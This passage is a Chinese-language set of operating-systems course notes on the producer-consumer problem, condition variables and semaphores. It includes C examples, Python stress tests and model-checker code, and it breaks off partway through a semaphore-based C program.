<h2 id="Producer-Consumer-Problem"><a href="#Producer-Consumer-Problem" class="headerlink" title="Producer-Consumer Problem"></a>Producer-Consumer Problem</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tproducer</span><span class="params">()</span> </span>&#123;<span class="keyword">while</span> (<span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;(&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tconsmuer</span><span class="params">()</span> </span>&#123;<span class="keyword">while</span> (<span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;)&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>我们希望生成合法的括号序列，且括号序列嵌套深度不超过给定值 $n$：</p>
<ul>
<li>producer: 序列深度小于 $n$ 才能打印；</li>
<li>consumer: 序列深度大于等于 1 才能打印。</li>
</ul>
<p>我们可以用一个队列来维护任务池，producer 将任务放到队尾，consumer 从队头取任务。取和放的操作都要在锁的保护下进行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">mutex_t</span> lk = MUTEX_INIT();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tproduce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == n) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tconsume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  assert(argc == <span class="number">2</span>);</span><br><span class="line">  n = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    create(Tproduce);</span><br><span class="line">    create(Tconsume);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tip: 如何证明这个模型是正确的？</strong></p>
<p>我们可以编写一个压力测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">limit = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">count, n = <span class="number">0</span>, <span class="number">100000</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> sys.stdin.read(n):</span><br><span class="line">  <span class="keyword">if</span> ch == <span class="string">&#x27;(&#x27;</span>: count += <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> ch == <span class="string">&#x27;)&#x27;</span>: count -= <span class="number">1</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="number">0</span> &lt;= count &lt;= limit</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n&#125;</span> Ok.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>指定较深层次的括号，每检查 100000 个括号输出一个 OK 信息。</p>
<p>我们还可以用 model checker 证明该模型的正确性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pc.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProducerConsumer</span>:</span></span><br><span class="line">locked, count, log, = <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryacquire</span>(<span class="params">self</span>):</span></span><br><span class="line">  self.locked, seen = <span class="string">&#x27;🔒&#x27;</span>, self.locked</span><br><span class="line">  <span class="keyword">return</span> seen == <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span>(<span class="params">self</span>):</span></span><br><span class="line">  self.locked = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@thread</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tp</span>(<span class="params">self</span>):</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> self.count == <span class="number">1</span>:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      self.release()</span><br><span class="line">  self.log, self.count = self.log + <span class="string">&#x27;(&#x27;</span>, self.count + <span class="number">1</span></span><br><span class="line">  self.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">@thread</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tc1</span>(<span class="params">self</span>):</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> self.count == <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      self.release()</span><br><span class="line">  self.log, self.count = self.log + <span class="string">&#x27;)&#x27;</span>, self.count - <span class="number">1</span></span><br><span class="line">  self.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">@thread</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tc2</span>(<span class="params">self</span>):</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> self.count == <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      self.release()</span><br><span class="line">  self.log, self.count = self.log + <span class="string">&#x27;)&#x27;</span>, self.count - <span class="number">1</span></span><br><span class="line">  self.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">@marker</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark_negative</span>(<span class="params">self, state</span>):</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> self.log:</span><br><span class="line">      <span class="keyword">if</span> ch == <span class="string">&#x27;(&#x27;</span>: count += <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> ch == <span class="string">&#x27;)&#x27;</span>: count -= <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> count &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用命令 <code>python model-checker.py pc.py | grep red</code> 可以快速检查是否有红色节点。</p>
</blockquote>
<h2 id="Conditional-Variable"><a href="#Conditional-Variable" class="headerlink" title="Conditional Variable"></a>Conditional Variable</h2><p>轮询地等待条件成立太浪费事件了。我们希望在条件不满足的时候进入睡眠状态，然后条件可能满足的时候把我唤醒，于是有了条件变量 (注：这个思想和睡眠锁类似，但等待的对象不一样。睡眠锁等待的是空锁的出现，而条件变量是在获得锁之后，等待关键变量相关的条件可能成立的时机)。</p>
<p>条件变量最基本的 API 有：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_wait</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cv, <span class="keyword">pthread_mutex_t</span> *lk)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_signal</span><span class="params">(<span class="keyword">pthread_cond_t</span> &amp;cv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_broadcast</span><span class="params">(<span class="keyword">ptread_cond_t</span> &amp;cv)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>wait() 函数传入一个条件变量和一个互斥锁，调用时要求线程持有该锁。wait() 会将这个互斥锁释放掉，然后睡眠该线程。等到有别的线程调用 signal() 或 broadcast() 来唤醒这个条件变量有关的线程时，wait() 会重新获得互斥锁，并继续执行下去。</li>
<li>signal() 和 broadcast() 的作用都是唤醒在条件变量 cv 上睡眠的线程。两者的不同是 signal() 只挑一个线程唤醒，broadcast() 会唤醒所有 cv 上的线程。</li>
</ul>
<p>条件变量的正确使用方式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mutex_lock(&amp;lk);</span><br><span class="line"><span class="keyword">while</span> (!cond) &#123;</span><br><span class="line">    cond_wait(&amp;cv, &amp;lk);</span><br><span class="line">&#125;</span><br><span class="line">assert(cond);</span><br><span class="line"></span><br><span class="line"><span class="comment">// do some job.</span></span><br><span class="line"><span class="comment">// if job is unrelated to critical variables, mutex lock can be released.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* if other threads&#x27; cv may be satisfied */</span></span><br><span class="line">cond_broadcase(&amp;cv);</span><br><span class="line"><span class="comment">/* ------------------------------------- */</span></span><br><span class="line">mutex_unlock(&amp;lk);</span><br></pre></td></tr></table></figure>

<p>有几点需要说明：</p>
<ul>
<li><p><code>while (!cond)</code> 写成 <code>if (!cond)</code> 是一个常见的错误。比如当前有一个 Tproducer 和两个 Tconsumer，那么可能出现 Tproducer 打印完 <code>(</code>  后唤醒了第一个 Tconsumer，然后第一个 Tconsumer 打印完 <code>)</code> (此时已经不能再打印 <code>)</code> ) 后唤醒了第二个 Tconsumer。如果是 <code>if (!cond)</code> ，第二个 Tconsumer 被唤醒了之后无法再进行条件检查，从而又打出一个 <code>)</code> 导致错误。</p>
<p>  使用 <code>while (!cond)</code> 保证了跳出 while 循环后 cond 一定是成立的。</p>
</li>
<li><p>使用 <code>cond_broadcast(&amp;cv)</code> 而不是 <code>cond_signal(&amp;cv)</code> 可以避免一些“死锁”情况，例如在没有多余的任务时，若干个 consumer 互相 signal 导致任务无法进行下去。</p>
</li>
</ul>
<blockquote>
<p><strong>Tproducer 完成任务后从唤醒一个睡在 comsumer-cv 上的线程，Tconsumer 完成任务后唤醒一个睡在 producer-cv 上的线程。为什么这个模型不对？</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProducerConsumer</span>:</span></span><br><span class="line">    locked, count, log, waitp, waitc = <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tryacquire</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.locked, seen = <span class="string">&#x27;🔒&#x27;</span>, self.locked</span><br><span class="line">        <span class="keyword">return</span> seen == <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">release</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.locked = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tp</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span> <span class="comment"># mutex_lock()</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.count == <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># cond_wait</span></span><br><span class="line">                _, self.waitp = self.release(), self.waitp + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waitp: <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">            self.log, self.count = self.log + <span class="string">&#x27;(&#x27;</span>, self.count + <span class="number">1</span></span><br><span class="line">            self.waitc = self.waitc[<span class="number">1</span>:] <span class="comment"># cond_signal</span></span><br><span class="line">            self.release() <span class="comment"># mutex_unlock()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tc1</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.count == <span class="number">0</span>:</span><br><span class="line">            _, self.waitc = self.release(), self.waitc + <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> self.waitc: <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        self.log, self.count = self.log + <span class="string">&#x27;)&#x27;</span>, self.count - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        self.waitp = self.waitp[<span class="number">1</span>:]</span><br><span class="line">        self.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tc2</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.count == <span class="number">0</span>:</span><br><span class="line">            _, self.waitc = self.release(), self.waitc + <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> self.waitc: <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.tryacquire(): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        self.log, self.count = self.log + <span class="string">&#x27;)&#x27;</span>, self.count - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        self.waitp = self.waitp[<span class="number">1</span>:]</span><br><span class="line">        self.release()</span><br></pre></td></tr></table></figure>

<p>使用 model checker 对该算法进行分析。下面的这种情形会导致问题：</p>
<ul>
<li>Tc2 首先运行，获得锁之后发现 <code>count == 0</code> ，于是释放锁并睡眠在 consumer-cv 上。</li>
<li>Tp 运行，获得锁之后打印左括号，<code>count += 1</code> ，唤醒了线程 Tc2，然后释放了锁。</li>
<li>Tc2 被唤醒了以后并没有获得锁，而是 Tc1 抢先获得了锁，打印了右括号，<code>count -= 1</code>，然后释放了锁。</li>
<li>Tc2 获得了锁。但此时 Tp 生产的资源已经被 Tc1 用掉了，Tc2 因为没有使用 while 判断 count，所以直接打印了右括号，<code>count -= 1</code>，错误发生。</li>
</ul>
</blockquote>
<p>只要是可以多线程的工作，都可以使用上面的模板来进行并行加速。通常来说，如果一个任务要分成若干个“层“，每”层“内的任务之间互相独立，我们就可以利用多线程加速每一层的运算 (但层与层之间的依赖关系是无法多线程加速的)。</p>
<h3 id="Example-fish"><a href="#Example-fish" class="headerlink" title="Example: fish"></a>Example: fish</h3><blockquote>
<p> 使用打印 <code>&lt;</code> <code>&gt;</code> 和 <code>_</code> 的三个线程连续输出小鱼。鱼的形态有两种：<code>&lt;&gt;&lt;_</code> 和 <code>&gt;&lt;&gt;_</code>。</p>
</blockquote>
<p>使用万能的条件变量。我们要搞清楚的事情是：这三个线程应该在什么条件下可以输出？我们画出状态机：</p>
<pre class="mermaid">stateDiagram-v2
    s1: A('')
    s1 --> s2: '<'
    s1 --> s3: '>'
    s2: B('<')
    s3: C('>')
    s2 --> s4: '>'
    s4: D('<>')
    s3 --> s5: '<'
    s5: E('><')
    s4 --> s6: '<'
    s5 --> s6: '>'
    s6: F('<><' or '><>')
    s6 --> s1: '_'</pre>

<p>我们只要在程序中维护当前到达的状态机顶点，然后根据状态机的出边决定某个线程是否可以打印即可。还需要注意的一点是：打印 <code>&lt;</code> <code>&gt;</code> <code>_</code> 的线程可能各有很多个。从状态机当前节点出发，只能有一个可行字符线程打印。因此还需要一个变量控制当前是否已经有线程在打印途中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fish.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH(arr) (sizeof(arr) / sizeof(arr[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> A = <span class="number">1</span>, B, C, D, E, F, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> from, ch, to;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> <span class="title">rules</span>[] =</span> &#123;</span><br><span class="line">  &#123; A, <span class="string">&#x27;&lt;&#x27;</span>, B &#125;,</span><br><span class="line">  &#123; B, <span class="string">&#x27;&gt;&#x27;</span>, C &#125;,</span><br><span class="line">  &#123; C, <span class="string">&#x27;&lt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; A, <span class="string">&#x27;&gt;&#x27;</span>, E &#125;,</span><br><span class="line">  &#123; E, <span class="string">&#x27;&lt;&#x27;</span>, F &#125;,</span><br><span class="line">  &#123; F, <span class="string">&#x27;&gt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; D, <span class="string">&#x27;_&#x27;</span>, A &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> current = A, quota = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> lk   = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="keyword">pthread_cond_t</span>  cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LENGTH(rules); i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> *<span class="title">rule</span> =</span> &amp;rules[i];</span><br><span class="line">    <span class="keyword">if</span> (rule-&gt;from == current &amp;&amp; rule-&gt;ch == ch) &#123;</span><br><span class="line">      <span class="keyword">return</span> rule-&gt;to;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_before</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  <span class="keyword">while</span> (!(next(ch) &amp;&amp; quota)) &#123;</span><br><span class="line">    <span class="comment">// can proceed only if (next(ch) &amp;&amp; quota)</span></span><br><span class="line">    pthread_cond_wait(&amp;cond, &amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">  quota--;</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_after</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  quota++;</span><br><span class="line">  current = next(ch);</span><br><span class="line">  assert(current);</span><br><span class="line">  pthread_cond_broadcast(&amp;cond);</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> roles[] = <span class="string">&quot;.&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;___&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_thread</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> role = roles[id];</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    fish_before(role);</span><br><span class="line">    <span class="built_in">putchar</span>(role); <span class="comment">// can be long; no lock protection</span></span><br><span class="line">    fish_after(role);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(roles); i++)</span><br><span class="line">    create(fish_thread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个 <code>fish.c</code> 写的非常漂亮。它完全复刻了状态机的思想，维护了可行的转移条件。变量 quota 保证了只有一个线程“出手”打印。</p>
<p>还值得注意的一点是，<code>putchar(role)</code> 这个操作和控制状态机转移的关键变量 current 和 quota 无关。且 I/O 操作理论上速度较慢。这样的工作是可以放在锁外面进行的 (事实上，由于 quota 的控制，这个操作并没有起到明显的优化效果)。</p>
<p>我们可以对其进行压力测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fish-check.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n, count = <span class="number">100000</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    animal = <span class="built_in">str</span>(sys.stdin.read(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">assert</span> animal == <span class="string">&#x27;&lt;&gt;&lt;_&#x27;</span> <span class="keyword">or</span> animal == <span class="string">&#x27;&gt;&lt;&gt;_&#x27;</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count == n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n&#125;</span> OK.&#x27;</span>)</span><br><span class="line">        count = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>在上述的括号打印问题中，我们使用互斥锁来保护我们对 count 变量的更新操作。一个想法是：可不可以不止一个锁，而是有 $n$ 个手环。手环数量不能超过上限，producer 可以生产手环，consumer 必须领到手环才能做事情？这种维护了“一堆手环”的锁就是信号量。</p>
<p>下面的 python 代码描述了信号量的行为建模：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sem.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Semaphore</span>:</span></span><br><span class="line">    token, waits = <span class="number">1</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">P</span>(<span class="params">self, tid</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.token &gt; <span class="number">0</span>:</span><br><span class="line">            self.token -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.waits = self.waits + tid</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">V</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.waits:</span><br><span class="line">            self.waits = self.waits[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.token += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t1</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.P(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waits: <span class="keyword">pass</span></span><br><span class="line">        cs = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> cs</span><br><span class="line">        self.V()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t2</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.P(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> self.waits: <span class="keyword">pass</span></span><br><span class="line">        cs = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> cs</span><br><span class="line">        self.V()</span><br></pre></td></tr></table></figure>

<p>变量 token 维护了资源 (手环) 的数量。P() 用于获取手环，如果当前有剩余的手环就领走，并进入临界区域；如果当前没有剩余的手环就进入等待序列。V() 用于归还手环。如果当前有正在等待的人，就直接将手环交给它 (wait list 队首元素弹出)，如果没有就归还给 kernel (token++)。</p>
<p>C 语言的线程库为我们提供了信号量的相关 API:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_init</span><span class="params">(<span class="keyword">sem_t</span> *sem, <span class="keyword">int</span> pshared, <span class="keyword">unsigned</span> <span class="keyword">int</span> value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_wait</span><span class="params">(<span class="keyword">sem_t</span> *sem)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_post</span><span class="params">(<span class="keyword">sem_t</span> *sem)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>sem_init() 用于初始化一个信号量，<code>pshared == 0</code> 表示该信号量只在当前进程的线程之间共享；<code>pshared == 1</code> 表示该信号量可以跨进程共享。value 表示信号量的初始值 (游泳馆的最大手环个数)。</li>
<li>sem_wait() 和 sem_post() 等价于之前的 P() 和 V()，用于领取手环和归还手环。</li>
</ul>
<p>利用这些 API 我们可以非常轻巧地实现之前的括号打印任务：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pc-sem.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sem_t</span> fill, empty;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    P(&amp;empty);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    V(&amp;fill);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    P(&amp;fill);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    V(&amp;empty);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  assert(argc == <span 